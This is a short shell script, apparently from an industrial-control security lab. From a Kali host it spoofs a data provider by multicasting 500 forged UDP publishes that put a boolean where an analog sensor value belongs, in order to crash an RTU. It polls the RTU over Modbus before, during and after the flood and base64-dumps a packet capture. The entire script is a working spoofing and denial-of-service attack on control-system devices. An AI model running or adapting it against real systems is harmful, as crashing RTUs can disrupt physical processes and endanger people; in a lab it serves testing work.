# kali: forge one provider publish with a bool on an analog point (lowersensor.active:true) and watch rtu-1 die; pcap
cd /tmp/miniccc/files; M=$(ls -t *mb.py | head -1); F=$(ls -t *forge_pub.py | head -1); P=/tmp/ev-typecrash-$$.pcap
ip link set eth1 up 2>/dev/null; ip addr add 172.16.1.200/24 dev eth1 2>/dev/null; sleep 1
tcpdump -i any -U -w $P '(udp port 40000 and src host 172.16.1.200) or (tcp port 502 and host 10.1.1.101)' 2>/tmp/tcpdump-$$.err & TP=$!; sleep 2
date -u +%FT%TZ
echo "--- rtu-1 before"; python3 $M raw 10.1.1.101 0475340001
echo "--- forge (multicast as the provider, 500 datagrams over 10 s): lowersensor.active is <analog> on rtu-1, send the text value true"; python3 $F 172.16.1.200 "lowersensor.active:true," 500 & FP=$!
sleep 6; echo "--- rtu-1 30004 (lowersensor.active) while the forged values arrive"; python3 $M raw 10.1.1.101 0475340001; wait $FP
sleep 2; date -u +%FT%TZ
echo "--- rtu-1 after"; for i in 1 2 3; do python3 $M raw 10.1.1.101 0475340001; sleep 1; done
sleep 1; kill $TP; sleep 1; echo "PCAP $(stat -c %s $P) bytes"; echo "PCAP-B64-BEGIN"; base64 -w0 $P; echo; echo "PCAP-B64-END"
